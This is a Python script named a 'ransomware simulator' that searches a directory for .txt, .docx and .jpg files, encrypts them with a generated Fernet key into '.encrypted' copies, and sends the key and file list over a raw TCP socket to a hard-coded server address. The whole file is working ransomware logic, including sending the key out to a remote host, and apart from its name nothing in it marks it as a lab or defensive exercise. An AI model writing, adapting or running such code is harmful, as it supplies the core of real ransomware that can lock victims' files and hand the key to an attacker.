import os
import json
import socket
from cryptography.fernet import Fernet

class RansomwareSimulator:
    def __init__(self, directory, server_host, server_port, file_extensions):
        self.directory = directory
        self.server_host = server_host
        self.server_port = server_port
        self.file_extensions = file_extensions
        self.key = Fernet.generate_key()

    def encrypt_file(self, file_path):
        fernet = Fernet(self.key)
        with open(file_path, 'rb') as file:
            original = file.read()
        encrypted = fernet.encrypt(original)

        encrypted_file_path = file_path + ".encrypted"
        with open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

        return encrypted_file_path

    def find_and_encrypt_files(self):
        encrypted_files = []
        for root, _, files in os.walk(self.directory):
            for file in files:
                if any(file.endswith(ext) for ext in self.file_extensions):
                    file_path = os.path.join(root, file)
                    encrypted_file_path = self.encrypt_file(file_path)
                    encrypted_files.append(encrypted_file_path)
                    print(f"Encrypted and saved file: {encrypted_file_path}")
        return encrypted_files

    def collect_data(self):
        return {
            'key': self.key.decode(),
            'encrypted_files': self.find_and_encrypt_files()
        }

    def send_data_to_server(self):
        data = self.collect_data()
        self.send_to_server(json.dumps(data))

    def send_to_server(self, data):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.server_host, self.server_port))
                s.sendall(data.encode())
        except Exception as e:
            print(f"Error sending data to server: {e}")

def main():
    file_extensions = ['.txt', '.docx', '.jpg']
    directory = '/home/user1/test'  # Replace with the directory path you want to target
    server_host = '172.16.0.20'
    server_port = 12345

    simulator = RansomwareSimulator(directory, server_host, server_port, file_extensions)
    simulator.send_data_to_server()

if __name__ == "__main__":
    main()